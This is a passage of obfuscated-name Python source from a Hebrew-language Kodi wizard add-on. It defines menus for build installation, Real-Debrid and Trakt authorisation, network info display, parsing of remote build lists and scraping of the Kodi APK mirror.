	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2432
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2434
def firstinstall ():#line:2436
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2437
def morsetup ():#line:2440
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2441
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2442
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2443
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2444
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2445
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2449
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2450
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2453
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2454
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2455
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2456
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2466
	setView ('files','viewType')#line:2467
def morsetup2 ():#line:2468
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2469
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2470
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2471
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2472
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2473
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2474
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2475
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2476
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2477
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2478
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2479
def fastupdate ():#line:2480
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2481
def forcefastupdate ():#line:2483
			O00OO0OOO000OO0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2484
			wiz .ForceFastUpDate (ADDONTITLE ,O00OO0OOO000OO0O0 )#line:2485
def rdsetup ():#line:2489
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2490
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2491
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2493
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2494
def traktsetup ():#line:2497
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2498
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2499
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2500
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2501
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2502
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2503
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2504
	setView ('files','viewType')#line:2505
def setautorealdebrid ():#line:2506
    from resources .libs import real_debrid #line:2507
    OOOO0OO000OO00O00 =real_debrid .RealDebridFirst ()#line:2508
    OOOO0OO000OO00O00 .auth ()#line:2509
def setrealdebrid ():#line:2511
    OO00OOOO00OO000O0 =(ADDON .getSetting ("auto_rd"))#line:2512
    if OO00OOOO00OO000O0 =='false':#line:2513
       ADDON .openSettings ()#line:2514
    else :#line:2515
        from resources .libs import real_debrid #line:2516
        O00000O00O00O0000 =real_debrid .RealDebrid ()#line:2517
        O00000O00O00O0000 .auth ()#line:2518
        rdon ()#line:2521
def resolveurlsetup ():#line:2523
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2524
def urlresolversetup ():#line:2525
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2526
def placentasetup ():#line:2528
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2529
def reptiliasetup ():#line:2530
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2531
def flixnetsetup ():#line:2532
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2533
def yodasetup ():#line:2534
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2535
def numberssetup ():#line:2536
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2537
def uranussetup ():#line:2538
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2539
def genesissetup ():#line:2540
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2541
def net_tools (view =None ):#line:2543
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2544
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2545
	setView ('files','viewType')#line:2547
def speedMenu ():#line:2548
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2549
def viewIP ():#line:2550
	O00OO0OO00OO0O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2564
	OOOOO00OOO0000O0O =[];OO00OOO0O0O00000O =0 #line:2565
	for O0O0O0O00O0O000O0 in O00OO0OO00OO0O0O0 :#line:2566
		O00O00OOO0O000O0O =wiz .getInfo (O0O0O0O00O0O000O0 )#line:2567
		OO0OO0O0O000O0O0O =0 #line:2568
		while O00O00OOO0O000O0O =="Busy"and OO0OO0O0O000O0O0O <10 :#line:2569
			O00O00OOO0O000O0O =wiz .getInfo (O0O0O0O00O0O000O0 );OO0OO0O0O000O0O0O +=1 ;wiz .log ("%s sleep %s"%(O0O0O0O00O0O000O0 ,str (OO0OO0O0O000O0O0O )));xbmc .sleep (1000 )#line:2570
		OOOOO00OOO0000O0O .append (O00O00OOO0O000O0O )#line:2571
		OO00OOO0O0O00000O +=1 #line:2572
	O0O0O0O0OOOOO0OOO ,OOOO0O0000O00OO0O ,O00O0OO000OOOOO0O =getIP ()#line:2573
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OOO0000O0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2574
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O0OOOOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2575
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0000O00OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2576
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OO000OOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2577
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OOO0000O0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2578
	setView ('files','viewType')#line:2579
def buildMenu ():#line:2581
	if USERNAME ==''or PASSWORD =='':#line:2582
		ADDON .openSettings ()#line:2583
	O0O0O0000O00OO0OO =u_list (SPEEDFILE )#line:2587
	(O0O0O0000O00OO0OO )#line:2588
	OO00O00OOO00OO00O =(wiz .workingURL (O0O0O0000O00OO0OO ))#line:2589
	(OO00O00OOO00OO00O )#line:2590
	OO00O00OOO00OO00O =wiz .workingURL (SPEEDFILE )#line:2591
	if not OO00O00OOO00OO00O ==True :#line:2592
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2593
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2594
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2595
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2596
		addFile ('%s'%OO00O00OOO00OO00O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2597
	else :#line:2598
		OO00OO0OO0000O000 ,O00OO0O00O0OO000O ,OO0OOO00000OOO000 ,O0OOO0O0OO00O0O00 ,O000OOO00OOO0O00O ,OOOO0OO00OOOOO0OO ,O00O0OO00O00O000O =wiz .buildCount ()#line:2599
		OO00OO0O0000O00OO =False ;O0OOOOO000O00O00O =[]#line:2600
		if THIRDPARTY =='true':#line:2601
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00OO0O0000O00OO =True ;O0OOOOO000O00O00O .append ('1')#line:2602
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00OO0O0000O00OO =True ;O0OOOOO000O00O00O .append ('2')#line:2603
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00OO0O0000O00OO =True ;O0OOOOO000O00O00O .append ('3')#line:2604
		OOO0000000OOO00OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2605
		O0OO00O000OOO0OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0000000OOO00OO )#line:2606
		if OO00OO0OO0000O000 ==1 and OO00OO0O0000O00OO ==False :#line:2607
			for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2608
				if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2609
				if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2610
				viewBuild (O0OO00O000OOO0OOO [0 ][0 ])#line:2611
				return #line:2612
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2615
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2616
		if OO00OO0O0000O00OO ==True :#line:2617
			for OO00O0O0O0O0OOO00 in O0OOOOO000O00O00O :#line:2618
				O0OO0O0OOO0OOO00O =eval ('THIRD%sNAME'%OO00O0O0O0O0OOO00 )#line:2619
		if len (O0OO00O000OOO0OOO )>=1 :#line:2621
			if SEPERATE =='true':#line:2622
				for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2623
					if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2624
					if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2625
					O00OO0O0OO0OOO000 =createMenu ('install','',O0OO0O0OOO0OOO00O )#line:2626
					addDir ('[%s] %s (v%s)'%(float (O0000OOO00O00O000 ),O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ),'viewbuild',O0OO0O0OOO0OOO00O ,description =OOOOO0OOOOOOOOO00 ,fanart =O00O0O000OO0O0O00 ,icon =OOO0OOO0O0OO0000O ,menu =O00OO0O0OO0OOO000 ,themeit =THEME2 )#line:2627
			else :#line:2628
				if O0OOO0O0OO00O0O00 >0 :#line:2629
					OOOOOOOO0O000O000 ='+'if SHOW17 =='false'else '-'#line:2630
					if SHOW17 =='true':#line:2632
						for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2634
							if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2635
							if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2636
							O0000OO0O00OOOOOO =int (float (O0000OOO00O00O000 ))#line:2637
							if O0000OO0O00OOOOOO ==17 :#line:2638
								O00OO0O0OO0OOO000 =createMenu ('install','',O0OO0O0OOO0OOO00O )#line:2639
								addDir ('[%s] %s (v%s)'%(float (O0000OOO00O00O000 ),O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ),'viewbuild',O0OO0O0OOO0OOO00O ,description =OOOOO0OOOOOOOOO00 ,fanart =O00O0O000OO0O0O00 ,icon =OOO0OOO0O0OO0000O ,menu =O00OO0O0OO0OOO000 ,themeit =THEME2 )#line:2640
				if O000OOO00OOO0O00O >0 :#line:2641
					OOOOOOOO0O000O000 ='+'if SHOW18 =='false'else '-'#line:2642
					if SHOW18 =='true':#line:2644
						for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2646
							if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2647
							if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2648
							O0000OO0O00OOOOOO =int (float (O0000OOO00O00O000 ))#line:2649
							if O0000OO0O00OOOOOO ==18 :#line:2650
								O00OO0O0OO0OOO000 =createMenu ('install','',O0OO0O0OOO0OOO00O )#line:2651
								addDir ('[%s] %s (v%s)'%(float (O0000OOO00O00O000 ),O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ),'viewbuild',O0OO0O0OOO0OOO00O ,description =OOOOO0OOOOOOOOO00 ,fanart =O00O0O000OO0O0O00 ,icon =OOO0OOO0O0OO0000O ,menu =O00OO0O0OO0OOO000 ,themeit =THEME2 )#line:2652
				if OO0OOO00000OOO000 >0 :#line:2653
					OOOOOOOO0O000O000 ='+'if SHOW16 =='false'else '-'#line:2654
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOOOOO0O000O000 ,OO0OOO00000OOO000 ),'togglesetting','show16',themeit =THEME3 )#line:2655
					if SHOW16 =='true':#line:2656
						for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2657
							if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2658
							if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2659
							O0000OO0O00OOOOOO =int (float (O0000OOO00O00O000 ))#line:2660
							if O0000OO0O00OOOOOO ==16 :#line:2661
								O00OO0O0OO0OOO000 =createMenu ('install','',O0OO0O0OOO0OOO00O )#line:2662
								addDir ('[%s] %s (v%s)'%(float (O0000OOO00O00O000 ),O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ),'viewbuild',O0OO0O0OOO0OOO00O ,description =OOOOO0OOOOOOOOO00 ,fanart =O00O0O000OO0O0O00 ,icon =OOO0OOO0O0OO0000O ,menu =O00OO0O0OO0OOO000 ,themeit =THEME2 )#line:2663
				if O00OO0O00O0OO000O >0 :#line:2664
					OOOOOOOO0O000O000 ='+'if SHOW15 =='false'else '-'#line:2665
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOOOOO0O000O000 ,O00OO0O00O0OO000O ),'togglesetting','show15',themeit =THEME3 )#line:2666
					if SHOW15 =='true':#line:2667
						for O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ,OO00OO0OO0O00OOO0 ,OO0O00OO000000O00 ,O0000OOO00O00O000 ,OOOO00OOOO00OOO00 ,OOO0OOO0O0OO0000O ,O00O0O000OO0O0O00 ,OOOOO0O0OOO0O000O ,OOOOO0OOOOOOOOO00 in O0OO00O000OOO0OOO :#line:2668
							if not SHOWADULT =='true'and OOOOO0O0OOO0O000O .lower ()=='yes':continue #line:2669
							if not DEVELOPER =='true'and wiz .strTest (O0OO0O0OOO0OOO00O ):continue #line:2670
							O0000OO0O00OOOOOO =int (float (O0000OOO00O00O000 ))#line:2671
							if O0000OO0O00OOOOOO <=15 :#line:2672
								O00OO0O0OO0OOO000 =createMenu ('install','',O0OO0O0OOO0OOO00O )#line:2673
								addDir ('[%s] %s (v%s)'%(float (O0000OOO00O00O000 ),O0OO0O0OOO0OOO00O ,O0OOO000000OO0O0O ),'viewbuild',O0OO0O0OOO0OOO00O ,description =OOOOO0OOOOOOOOO00 ,fanart =O00O0O000OO0O0O00 ,icon =OOO0OOO0O0OO0000O ,menu =O00OO0O0OO0OOO000 ,themeit =THEME2 )#line:2674
		elif O00O0OO00O00O000O >0 :#line:2675
			if OOOO0OO00OOOOO0OO >0 :#line:2676
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2677
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2678
			else :#line:2679
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2680
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2681
	setView ('files','viewType')#line:2682
def viewBuild (O0O000O0O0OOO0000 ):#line:2684
	OO0OOO0O0O0O0000O =wiz .workingURL (SPEEDFILE )#line:2685
	if not OO0OOO0O0O0O0000O ==True :#line:2686
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2687
		addFile ('%s'%OO0OOO0O0O0O0000O ,'',themeit =THEME3 )#line:2688
		return #line:2689
	if wiz .checkBuild (O0O000O0O0OOO0000 ,'version')==False :#line:2690
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2691
		addFile ('%s was not found in the builds list.'%O0O000O0O0OOO0000 ,'',themeit =THEME3 )#line:2692
		return #line:2693
	OO00OOO00OOO0O000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2694
	OO00O0O0OOO0000O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O000O0O0OOO0000 ).findall (OO00OOO00OOO0O000 )#line:2695
	for OOO00O00O0O0OOO00 ,O000OOO00OOO0000O ,O0O0OOOOO000OOO00 ,O00000OOOOO0OO000 ,O0OOOO000O00O0000 ,OOO0O0O0O0O00O0O0 ,O0O00OO000OO000O0 ,O0OOO000O0O000O00 ,OO0000000OO00O00O ,OO0O000O000O0O0OO in OO00O0O0OOO0000O0 :#line:2696
		OOO0O0O0O0O00O0O0 =OOO0O0O0O0O00O0O0 if wiz .workingURL (OOO0O0O0O0O00O0O0 )else ICON #line:2697
		O0O00OO000OO000O0 =O0O00OO000OO000O0 if wiz .workingURL (O0O00OO000OO000O0 )else FANART #line:2698
		O0O0OOO0OO0000O0O ='%s (v%s)'%(O0O000O0O0OOO0000 ,OOO00O00O0O0OOO00 )#line:2699
		if BUILDNAME ==O0O000O0O0OOO0000 and OOO00O00O0O0OOO00 >BUILDVERSION :#line:2700
			O0O0OOO0OO0000O0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0O0OOO0OO0000O0O ,BUILDVERSION )#line:2701
		OO0O0OOO000OOO00O =int (float (KODIV ));O0OO0O0OOO00000OO =int (float (O00000OOOOO0OO000 ))#line:2710
		if not OO0O0OOO000OOO00O ==O0OO0O0OOO00000OO :#line:2711
			if OO0O0OOO000OOO00O ==16 and O0OO0O0OOO00000OO <=15 :O0OO00O0O0OO0O000 =False #line:2712
			else :O0OO00O0O0OO0O000 =True #line:2713
		else :O0OO00O0O0OO0O000 =False #line:2714
		addFile ('התקנה','install',O0O000O0O0OOO0000 ,'fresh',description =OO0O000O000O0O0OO ,fanart =O0O00OO000OO000O0 ,icon =OOO0O0O0O0O00O0O0 ,themeit =THEME1 )#line:2718
		if not O0OOOO000O00O0000 =='http://':#line:2721
			if wiz .workingURL (O0OOOO000O00O0000 )==True :#line:2722
				addFile (wiz .sep ('THEMES'),'',fanart =O0O00OO000OO000O0 ,icon =OOO0O0O0O0O00O0O0 ,themeit =THEME3 )#line:2723
				OO00OOO00OOO0O000 =wiz .openURL (O0OOOO000O00O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2724
				OO00O0O0OOO0000O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OOO00OOO0O000 )#line:2725
				for O0O0000O0OOO00OO0 ,O0OO00O0OOO0O00O0 ,OO0OOOO0OO0OOO0O0 ,OOO000000000O0000 ,OOO000OOO0OO00000 ,OO0O000O000O0O0OO in OO00O0O0OOO0000O0 :#line:2726
					if not SHOWADULT =='true'and OOO000OOO0OO00000 .lower ()=='yes':continue #line:2727
					OO0OOOO0OO0OOO0O0 =OO0OOOO0OO0OOO0O0 if OO0OOOO0OO0OOO0O0 =='http://'else OOO0O0O0O0O00O0O0 #line:2728
					OOO000000000O0000 =OOO000000000O0000 if OOO000000000O0000 =='http://'else O0O00OO000OO000O0 #line:2729
					addFile (O0O0000O0OOO00OO0 if not O0O0000O0OOO00OO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0O0000O0OOO00OO0 ,'theme',O0O000O0O0OOO0000 ,O0O0000O0OOO00OO0 ,description =OO0O000O000O0O0OO ,fanart =OOO000000000O0000 ,icon =OO0OOOO0OO0OOO0O0 ,themeit =THEME3 )#line:2730
	setView ('files','viewType')#line:2731
def viewThirdList (OOOO0O0OOOO0O00O0 ):#line:2733
	O0OO0OO0000O0OOOO =eval ('THIRD%sNAME'%OOOO0O0OOOO0O00O0 )#line:2734
	O00O00O0OO000OO0O =eval ('THIRD%sURL'%OOOO0O0OOOO0O00O0 )#line:2735
	O0O0OOO0OOOO0OOO0 =wiz .workingURL (O00O00O0OO000OO0O )#line:2736
	if not O0O0OOO0OOOO0OOO0 ==True :#line:2737
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2738
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2739
	else :#line:2740
		OOOOOOOOO0O000000 ,O00O000O0O000O000 =wiz .thirdParty (O00O00O0OO000OO0O )#line:2741
		addFile ("[B]%s[/B]"%O0OO0OO0000O0OOOO ,'',themeit =THEME3 )#line:2742
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2743
		if OOOOOOOOO0O000000 :#line:2744
			for O0OO0OO0000O0OOOO ,O0OOOO0OO0O0O0OOO ,O00O00O0OO000OO0O ,OO0OO00OO0OOO0OOO ,OO0OOOO00OOO0000O ,OOOO000O0000OO0OO ,O0OO0OOO00OO0OOO0 ,O0OO00OOOOO00OO0O in O00O000O0O000O000 :#line:2745
				if not SHOWADULT =='true'and O0OO0OOO00OO0OOO0 .lower ()=='yes':continue #line:2746
				addFile ("[%s] %s v%s"%(OO0OO00OO0OOO0OOO ,O0OO0OO0000O0OOOO ,O0OOOO0OO0O0O0OOO ),'installthird',O0OO0OO0000O0OOOO ,O00O00O0OO000OO0O ,icon =OO0OOOO00OOO0000O ,fanart =OOOO000O0000OO0OO ,description =O0OO00OOOOO00OO0O ,themeit =THEME2 )#line:2747
		else :#line:2748
			for O0OO0OO0000O0OOOO ,O00O00O0OO000OO0O ,OO0OOOO00OOO0000O ,OOOO000O0000OO0OO ,O0OO00OOOOO00OO0O in O00O000O0O000O000 :#line:2749
				addFile (O0OO0OO0000O0OOOO ,'installthird',O0OO0OO0000O0OOOO ,O00O00O0OO000OO0O ,icon =OO0OOOO00OOO0000O ,fanart =OOOO000O0000OO0OO ,description =O0OO00OOOOO00OO0O ,themeit =THEME2 )#line:2750
def editThirdParty (OOOOOOO0O00000O0O ):#line:2752
	O0000O000000OO000 =eval ('THIRD%sNAME'%OOOOOOO0O00000O0O )#line:2753
	OO0OO000000000000 =eval ('THIRD%sURL'%OOOOOOO0O00000O0O )#line:2754
	OOOO0OOO0O0OO0OO0 =wiz .getKeyboard (O0000O000000OO000 ,'Enter the Name of the Wizard')#line:2755
	O0OO00O00OO00OOOO =wiz .getKeyboard (OO0OO000000000000 ,'Enter the URL of the Wizard Text')#line:2756
	wiz .setS ('wizard%sname'%OOOOOOO0O00000O0O ,OOOO0OOO0O0OO0OO0 )#line:2758
	wiz .setS ('wizard%surl'%OOOOOOO0O00000O0O ,O0OO00O00OO00OOOO )#line:2759
def apkScraper (name =""):#line:2761
	if name =='kodi':#line:2762
		O0OO000O0O00O0OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2763
		O00O0O00000OOOO00 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2764
		O000000O0OO0O00O0 =wiz .openURL (O0OO000O0O00O0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2765
		O00O00O0O0OOOO00O =wiz .openURL (O00O0O00000OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2766
		OO000000OO0OO0OO0 =0 #line:2767
		OOO0000000000O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000000O0OO0O00O0 )#line:2768
		O0O00OO00O0O00O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00O00O0O0OOOO00O )#line:2769
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2771
		OO00OOO0000OO0OOO =False #line:2772
		for OO0OOO0OOOO00O000 ,name ,O000O00000O0OO00O ,O000000O0000OOO0O in OOO0000000000O0O0 :#line:2773
			if OO0OOO0OOOO00O000 in ['../','old/']:continue #line:2774
			if not OO0OOO0OOOO00O000 .endswith ('.apk'):continue #line:2775
			if not OO0OOO0OOOO00O000 .find ('_')==-1 and OO00OOO0000OO0OOO ==True :continue #line:2776
			try :#line:2777
				O00OO00O00O00O0OO =name .split ('-')#line:2778
				if not OO0OOO0OOOO00O000 .find ('_')==-1 :#line:2779
					OO00OOO0000OO0OOO =True #line:2780
					O0OOOO0O00OO0OOO0 ,O0OOOO0O000O00000 =O00OO00O00O00O0OO [2 ].split ('_')#line:2781
				else :#line:2782
